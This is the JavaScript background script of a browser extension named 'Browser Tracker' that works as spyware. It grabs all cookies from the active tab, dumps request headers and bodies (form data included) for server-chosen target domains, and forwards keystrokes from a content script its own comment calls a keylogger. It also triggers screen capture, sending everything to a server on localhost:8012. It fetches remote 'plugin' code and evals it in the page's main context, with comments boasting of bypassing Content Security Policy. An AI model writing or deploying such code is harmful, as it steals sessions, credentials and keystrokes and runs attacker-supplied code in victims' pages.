// Storage for active tabs history
let tabHistory = [];
let currentTab = null;
// Detect browser type Firefox, Chrome, Opera etc.
const browserName =
  ["Firefox", "Chrome", "Opera", "Edge", "Brave"].find((name) =>
    navigator.userAgent.toLowerCase().includes(name.toLowerCase())
  ) || "Unknown";
const browserVersionMatch = navigator.userAgent.match(
  new RegExp(`${browserName}[\\/\\s](\\d+)`, "i")
);
const browserVersion = browserVersionMatch ? browserVersionMatch[1] : "Unknown";

const funcEnabled = {
  activeTab: true,
  getCookies: true,
  dumpRequest: true,
  saveTabActivity: true,
  sendToLocalServer: true,
  loadPlugins: true,
};

const displayConsoleLogs = [
  // 'activeTab',
  // 'getCookies',
  // 'sendToLocalServer',
  // 'dumpRequest',
  // 'saveTabActivity',
  "loadPlugins",
];

const displayConsoleLogResponseServerMatchesEndpoints = [
  "/target-domains",
  "/get-plugins",
  "/tab-activity",
  "/capture-start",
  "/capture-stop",
  "/keystrokes",
  "/request-dump",
  "/request-headers",
];

/**
 * Plugin loaded status
 * @type {Object<string, {domain: string, plugins: Array<string>}>}
 */
const pluginLoaded = {};

// Local server configuration
const LOCAL_SERVER_URL = "http://localhost:8012"; // Change port if needed
const SEND_LOCAL_SERVER = true; // Set to false to disable sending data to server

// Use browser API for Firefox (or chrome for compatibility)
const browserAPI = typeof browser !== "undefined" ? browser : chrome;
let targetDomains = [];

async function getTargetDomains() {
  try {
    const response = await getFromLocalServer("/target-domains");

    if (response && Array.isArray(response.domains)) {
      return response.domains;
    }
  } catch (error) {
    console.error("Error fetching target domains from server:", error);
  }
}
/**
 * Function to send data to local server
 * @param {string} endpoint - Path to API endpoint (e.g., '/api/tabs')
 * @param {object} data - Data to send
 * @param {string} method - HTTP method (GET, POST, PUT, DELETE)
 * @returns {Promise<object>} - Response from server
 */
async function sendToLocalServer(endpoint, data = null, method = "POST") {
  if (!funcEnabled.sendToLocalServer) {
    if (displayConsoleLogs.includes("sendToLocalServer")) {
      console.log("sendToLocalServer is disabled");
    }
    return;
  }

  if (!SEND_LOCAL_SERVER) {
    if (displayConsoleLogs.includes("sendToLocalServer")) {
      console.log("Sending to local server is disabled.");
    }
    return;
  }

  try {
    const options = {
      method: method,
      headers: {
        "Content-Type": "application/json",
      },
    };

    if (data && method !== "GET") {
      if (displayConsoleLogs.includes("sendToLocalServer")) {
        console.log("Data to send:", data);
      }
      data.browser = browserName;
      options.body = JSON.stringify(data);
    }

    const url = `${LOCAL_SERVER_URL}${endpoint}`;
    if (displayConsoleLogs.includes("sendToLocalServer")) {
      console.log(`Sending ${method} request to ${url}`);
    }

    const response = await fetch(url, options);

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const result = await response.json();
    if (
      displayConsoleLogs.includes("sendToLocalServer") &&
      displayConsoleLogResponseServerMatchesEndpoints.includes(endpoint)
    ) {
      console.log("Response from server:", result);
    }
    return result;
  } catch (error) {
    console.error("Error sending data to server:", error);
    throw error;
  }
}

/**
 * Function to get data from local server
 * @param {string} endpoint - Path to API endpoint
 * @param {object} data - Data to send (for POST requests)
 * @param {string} method - HTTP method (GET, POST)
 * @returns {Promise<object>} - Data from server
 */
async function getFromLocalServer(endpoint, data = null, method = "GET") {
  return await sendToLocalServer(endpoint, data, method);
}

/**
 * Function to get all cookies from active tab
 * @param {string} url - Tab URL to get cookies from
 * @returns {Promise<Array>} - Array of cookies
 */
async function getCookiesFromTab(url) {
  if (!funcEnabled.getCookies) {
    if (displayConsoleLogs.includes("getCookies")) {
      console.log("getCookies is disabled");
    }
    return [];
  }

  try {
    if (!url) {
      console.warn("URL not specified for getting cookies");
      return [];
    }

    // Get all cookies for this URL
    const cookies = await browserAPI.cookies.getAll({ url: url });
    if (displayConsoleLogs.includes("getCookies")) {
      console.log(`Got ${cookies.length} cookies for ${url}`);
    }
    return cookies;
  } catch (error) {
    console.error("Error getting cookies:", error);
    return [];
  }
}

/**
 * Function to get cookies from active tab
 * @returns {Promise<object>} - Object with URL and array of cookies
 */
async function getActiveTabCookies() {
  if (!funcEnabled.getCookies) {
    if (displayConsoleLogs.includes("getCookies")) {
      console.log("getCookies is disabled");
    }
    return { url: null, cookies: [] };
  }

  try {
    const tabs = await browserAPI.tabs.query({ active: true, currentWindow: true });
    const tab = tabs[0];

    if (!tab || !tab.url) {
      console.warn("Active tab not found or URL unavailable");
      return { url: null, cookies: [] };
    }

    const cookies = await getCookiesFromTab(tab.url);

    return {
      url: tab.url,
      title: tab.title,
      cookies: cookies,
      cookieCount: cookies.length,
    };
  } catch (error) {
    console.error("Error getting active tab cookies:", error);
    return { url: null, cookies: [] };
  }
}

/**
 * Function to capture and dump HTTP requests with data
 * @param {object} details - Request details from webRequest API
 */
async function dumpRequest(details) {
  if (!funcEnabled.dumpRequest) {
    if (displayConsoleLogs.includes("dumpRequest")) {
      console.log("dumpRequest is disabled");
    }
    return;
  }

  try {
    const requestDump = {
      requestId: details.requestId,
      url: details.url,
      method: details.method,
      type: details.type,
      tabId: details.tabId,
      timestamp: new Date().toISOString(),
      timeStamp: details.timeStamp,
    };

    // Add request headers if available
    if (details.requestHeaders) {
      requestDump.requestHeaders = details.requestHeaders.reduce((acc, header) => {
        acc[header.name] = header.value;
        return acc;
      }, {});
    }

    // Add request body if available (for POST, PUT, PATCH)
    if (details.requestBody) {
      if (details.requestBody.formData) {
        requestDump.formData = details.requestBody.formData;
      }
      if (details.requestBody.raw) {
        requestDump.rawData = details.requestBody.raw.map((item) => {
          if (item.bytes) {
            // Convert ArrayBuffer to string
            const decoder = new TextDecoder("utf-8");
            try {
              return decoder.decode(item.bytes);
            } catch (e) {
              return "[Binary data]";
            }
          }
          return item;
        });
      }
    }

    if (displayConsoleLogs.includes("dumpRequest")) {
      console.log("Request dump captured:", requestDump.method, requestDump.url);
    }

    // Send to local server
    sendToLocalServer("/request-dump", requestDump).catch((err) => {
      if (displayConsoleLogs.includes("dumpRequest")) {
        console.log("Failed to send request dump:", err.message);
      }
    });
  } catch (error) {
    console.error("Error dumping request:", error);
  }
}

// Loading plugins in content scripts can be added here if needed
async function loadPlugins(tabId, domain) {
  if (!funcEnabled.loadPlugins) {
    if (displayConsoleLogs.includes("loadPlugins")) {
      console.log("loadPlugins is disabled");
    }
    return;
  }

  if (displayConsoleLogs.includes("loadPlugins")) {
    console.log(`Loading plugins for domain: ${domain} in tab ${tabId}`);
  }

  const methodInjects = {
    direct: (plugin) => ({
      world: "MAIN",
      func: (plugin) => {
        try {
          const scriptId = `plugin-${plugin.name}`;
          if (document.getElementById(scriptId)) {
            console.log(`Plugin script ${plugin.name} already injected.`);
            return false;
          }
          const script = document.createElement("script");
          script.id = scriptId;
          script.textContent = plugin.code;
          document.head.appendChild(script);
          console.log(`Injected plugin script: ${plugin.name}`);
        } catch (e) {
          console.error(`[Plugin] Error injecting ${plugin.name}:`, e);
          return { success: false, error: e.message };
        }
        return true;
      },
      args: [plugin],
    }),
    // isolated: (plugin) => ({
    //   world: "ISOLATED",
    //   func: (plugin) => {
    //     const scriptId = `plugin-${plugin.name}`;
    //     try {
    //       // Create Blob URL to bypass CSP
    //       const blob = new Blob([plugin.code], { type: "application/javascript" });
    //       const url = URL.createObjectURL(blob);

    //       const script = document.createElement("script");
    //       script.id = scriptId;
    //       script.src = url; // Use src instead of textContent
    //       // script.type = "text/javascript";

    //       script.onload = () => {
    //         URL.revokeObjectURL(url);
    //         console.log(`[Plugin] ${plugin.name} loaded successfully`);
    //       };

    //       script.onerror = (error) => {
    //         URL.revokeObjectURL(url);
    //         console.error(`[Plugin] ${plugin.name} failed to load:`, error);
    //       };

    //       (document.head || document.documentElement).appendChild(script);

    //       return { success: true, method: "blob-url" };
    //     } catch (e) {
    //       console.error(`[Plugin] Error injecting ${plugin.name}:`, e);
    //       return { success: false, error: e.message };
    //     }
    //   },
    //   args: [plugin],
    // }),
    // eval: (plugin) => ({
    //   world: "ISOLATED",
    //   func: (pluginCode, pluginName) => {
    //     const scriptId = `plugin-${pluginName}`;

    //     // Check if already loaded
    //     if (document.getElementById(scriptId)) {
    //       console.log(`[Plugin] ${pluginName} already injected.`);
    //       return { success: false, reason: "already-loaded" };
    //     }

    //     try {
    //       // Encode plugin code to base64 (without deprecated unescape)
    //       const encoded = btoa(
    //         encodeURIComponent(pluginCode).replace(/%([0-9A-F]{2})/g, (match, p1) =>
    //           String.fromCharCode(parseInt(p1, 16))
    //         )
    //       );
    //       // МЕТОД: Inject через вставку в атрибут страницы и чтение из MAIN контекста
    //       // 1. Создаем невидимый элемент с кодом плагина
    //       const container = document.createElement("div");
    //       container.id = scriptId;
    //       container.style.display = "none";
    //       container.setAttribute("data-plugin-code", encoded);
    //       container.setAttribute("data-plugin-name", pluginName);
    //       document.body.appendChild(container);

    //       // 2. Inject bootstrapper script that reads and executes the code
    //       const bootstrapScript = document.createElement("script");
    //       bootstrapScript.textContent = `
    //                 (function() {
    //                   const container = document.getElementById('${scriptId}');
    //                   if (container) {
    //                     try {
    //                       const code = decodeURIComponent(escape(atob(container.getAttribute('data-plugin-code'))));
    //                       const name = container.getAttribute('data-plugin-name');
    //                       eval(code);
    //                       console.log('[Plugin] ' + name + ' loaded via ISOLATED inject');
    //                     } catch (e) {
    //                       console.error('[Plugin] Error loading ${pluginName}:', e);
    //                     }
    //                   }
    //                 })();
    //               `;

    //       (document.head || document.documentElement).appendChild(bootstrapScript);
    //       bootstrapScript.remove(); // Clean up

    //       return { success: true, method: "isolated-eval" };
    //     } catch (e) {
    //       console.error(`[Plugin] Error injecting ${pluginName}:`, e);
    //       return { success: false, error: e.message };
    //     }
    //   },
    //   args: [plugin.code, plugin.name],
    // }),
    // simpleEval: (plugin) => ({
    //   world: "ISOLATED",
    //   func: (pluginCode, pluginName) => {
    //      eval(pluginCode);
    //     console.log(`Injected plugin script: ${pluginName} via simple eval`);
    //     return true;
    //   },
    //   args: [plugin.code, plugin.name],
    // }),

    // CSP-safe method: executes directly in MAIN world without creating script elements
    cspSafe: (plugin) => ({
      world: "MAIN", // Execute directly in page context - bypasses CSP!
      func: (pluginCode, pluginName) => {
        if (window[`__plugin_${pluginName}_loaded__`]) {
          return false;
        }
        
        try {
          // Direct eval in MAIN world - no script element creation, no CSP violation
          // This works because Chrome's executeScript with world:"MAIN" has special CSP bypass
          (0, eval)(pluginCode);
          
          window[`__plugin_${pluginName}_loaded__`] = true;
          console.log(`[Plugin] ${pluginName} loaded successfully in MAIN world`);
          return true;
        } catch (error) {
          console.error(`[Plugin] Error loading ${pluginName}:`, error);
          return false;
        }
      },
      args: [plugin.code, plugin.name],
    }),
  };

  try {
    const response = await getFromLocalServer(
      `/get-plugins`,
      {
        domain,
        browser: browserName,
        version: browserVersion,
      },
      "POST"
    );
    if (displayConsoleLogs.includes("loadPlugins")) {
      console.log("Plugins response from server:", response);
    }
    if (response && Array.isArray(response.plugins)) {
      const pluginsToLoad = response.plugins;

      if (pluginsToLoad.length > 0) {
        for (const plugin of pluginsToLoad) {
          // Inject content script to load plugin
          const resultExecuted = await browserAPI.scripting.executeScript({
            target: { tabId: tabId, allFrames: false },
            ...methodInjects.cspSafe(plugin),
          });

          if (displayConsoleLogs.includes("loadPlugins")) {
            for (const frameResult of resultExecuted) {
              const { frameId, result } = frameResult;
              console.log(`Frame ${frameId} result:`, result);
              if (result) {
                console.log(`Plugin ${plugin.name} loaded in frame ${frameId}`);
              } else {
                console.log(`Plugin ${plugin.name} was already loaded in frame ${frameId}`);
              }
            }
          }
          // Mark plugin as loaded
          if (!pluginLoaded[plugin.name]) {
            pluginLoaded[plugin.name] = { domain: domain, plugins: [plugin.name] };
          } else {
            pluginLoaded[plugin.name].plugins.push(plugin.name);
          }
        }
      } else {
        if (displayConsoleLogs.includes("loadPlugins")) {
          console.log(`No plugins to load for domain: ${domain}`);
        }
      }
    }
  } catch (error) {
    console.error("Error loading plugins:", error);
  }
}

// Function to save tab data
async function saveTabActivity(tab) {
  if (!funcEnabled.saveTabActivity) {
    if (displayConsoleLogs.includes("saveTabActivity")) {
      console.log("saveTabActivity is disabled");
    }
    return;
  }

  const cookies = await getActiveTabCookies();

  const targetDomains = await getTargetDomains();

  if (!targetDomains.some((domain) => tab.url.includes(domain))) {
    if (displayConsoleLogs.includes("saveTabActivity")) {
      console.log("Tab URL not in target domains, skipping save");
    }
    return;
  }

  // Parse domain from URL
  const urlObj = new URL(tab.url);
  const domain = urlObj.hostname;

  const activity = {
    id: tab.id,
    url: tab.url,
    title: tab.title,
    timestamp: new Date().toISOString(),
    windowId: tab.windowId,
    cookies: cookies.cookies,
    tag: domain,
  };

  tabHistory.push(activity);
  currentTab = activity;

  // Save to browser.storage
  await browserAPI.storage.local.set({
    tabHistory: tabHistory,
    currentTab: currentTab,
  });

  if (displayConsoleLogs.includes("saveTabActivity")) {
    console.log("Active tab:", activity);
  }

  // Send data to local server (optional)
  sendToLocalServer("/tab-activity", activity).catch((err) => {
    if (displayConsoleLogs.includes("saveTabActivity")) {
      console.log("Server unavailable:", err.message);
    }
  });

  sendToLocalServer("/capture-start", activity).catch((err) => {
    if (displayConsoleLogs.includes("saveTabActivity")) {
      console.log("Server unavailable for video capture:", err.message);
    }
  });
}

// Track tab activation
browserAPI.tabs.onActivated.addListener(async (activeInfo) => {
  try {
    const tab = await browserAPI.tabs.get(activeInfo.tabId);
    loadPlugins(tab.id, new URL(tab.url).hostname);
    saveTabActivity(tab);
  } catch (error) {
    console.error("Error getting tab information:", error);
  }
});

// Track tab updates (when URL changes)
browserAPI.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  // Check if this is active tab and URL has changed
  if (changeInfo.status === "complete" && tab.active) {
    loadPlugins(tab.id, new URL(tab.url).hostname);
    saveTabActivity(tab);
  }
});

// Track window focus changes
browserAPI.windows.onFocusChanged.addListener(async (windowId) => {
  if (windowId === browserAPI.windows.WINDOW_ID_NONE) {
    // stop video capture on blur
    sendToLocalServer("/capture-stop").catch((err) => {
      if (displayConsoleLogs.includes("sendToLocalServer")) {
        console.log("Server unavailable for stopping video capture:", err.message);
      }
    });
    console.log("Browser lost focus");
    return;
  }

  try {
    const tabs = await browserAPI.tabs.query({ active: true, windowId: windowId });
    if (tabs[0]) {
      loadPlugins(tabs[0].id, new URL(tabs[0].url).hostname);
      saveTabActivity(tabs[0]);
    }
  } catch (error) {
    console.error("Error on window focus change:", error);
  }
});

// Intercept and dump HTTP requests for target domains
browserAPI.webRequest.onBeforeRequest.addListener(
  async (details) => {
    // Filter requests to target domains only
    const url = new URL(details.url);
    if (targetDomains.some((domain) => url.hostname.includes(domain))) {
      // Only dump main requests and XHR/fetch requests
      if (
        details.type === "main_frame" ||
        details.type === "sub_frame" ||
        details.type === "xmlhttprequest"
      ) {
        dumpRequest(details);
      }
    } else {
      if (displayConsoleLogs.includes("dumpRequest")) {
        console.log(`onBeforeRequest to non-target domain: ${url.hostname}`);
      }
    }
  },
  { urls: ["<all_urls>"] },
  ["requestBody"]
);

// Intercept request headers
browserAPI.webRequest.onSendHeaders.addListener(
  async (details) => {
    const url = new URL(details.url);
    if (targetDomains.some((domain) => url.hostname.includes(domain))) {
      if (
        details.type === "main_frame" ||
        details.type === "sub_frame" ||
        details.type === "xmlhttprequest"
      ) {
        // Update request dump with headers
        const headersDump = {
          requestId: details.requestId,
          url: details.url,
          method: details.method,
          timestamp: new Date().toISOString(),
          headers: details.requestHeaders
            ? details.requestHeaders.reduce((acc, header) => {
                acc[header.name] = header.value;
                return acc;
              }, {})
            : {},
        };

        sendToLocalServer("/request-headers", headersDump).catch((err) => {
          console.log("Failed to send headers dump:", err.message);
        });
      }
    } else {
      if (displayConsoleLogs.includes("dumpRequest")) {
        console.log(`onSendHeaders headers to non-target domain: ${url.hostname}`);
      }
    }
  },
  { urls: ["<all_urls>"] },
  ["requestHeaders"]
);

// Initialization on startup
browserAPI.runtime.onInstalled.addListener(async () => {
  console.log("Browser Tracker installed");

  try {
    targetDomains = await getTargetDomains();
  } catch (error) {
    console.error("Error getting target domains:", error);
  }

  // Load history from storage
  const result = await browserAPI.storage.local.get(["tabHistory", "currentTab"]);
  tabHistory = result.tabHistory || [];
  currentTab = result.currentTab || null;
});

// Load current active tab on startup
browserAPI.tabs.query({ active: true, currentWindow: true }).then((tabs) => {
  if (tabs[0]) {
    loadPlugins(tabs[0].id, new URL(tabs[0].url).hostname);
    saveTabActivity(tabs[0]);
  }
});

// Listen for messages from content scripts (keylogger)
browserAPI.runtime.onMessage.addListener((message, sender, sendResponse) => {
  // Handle keystroke data
  if (message.type === "keystrokes") {
    console.log("Received keystrokes from content script:", message.data);

    // Add tab information
    const keystrokeData = {
      ...message.data,
      tabId: sender.tab ? sender.tab.id : null,
      tabUrl: sender.tab ? sender.tab.url : null,
      tabTitle: sender.tab ? sender.tab.title : null,
    };

    // Send to local server
    sendToLocalServer("/keystrokes", keystrokeData).catch((err) => {
      console.log("Server unavailable for keystrokes:", err.message);
    });

    sendResponse({ success: true });
  }

  // Handle plugin messages - Universal handler for all plugins
  if (message.type === "plugin-message") {
    console.log("[Background] Plugin message received:", message);

    // Send all plugin actions to server for processing
    sendToLocalServer("/plugin-action", {
      plugin: message.plugin,
      action: message.action,
      data: message.data,
      sender: {
        tabId: sender.tab ? sender.tab.id : null,
        url: sender.tab ? sender.tab.url : null,
        frameId: sender.frameId,
      },
    })
      .then((result) => {
        console.log("[Background] Plugin action result:", result);
        sendResponse({
          action: message.action + "Response",
          success: result.success,
          message: result.message,
          data: result.data,
          ...result,
        });
      })
      .catch((err) => {
        console.error("[Background] Error processing plugin action:", err);
        sendResponse({
          action: message.action + "Response",
          success: false,
          message: "Не удалось обработать действие плагина в background: " + err.message,
        });
      });
    return true; // Async response
  }

  return true; // Keep message channel open for async response
});
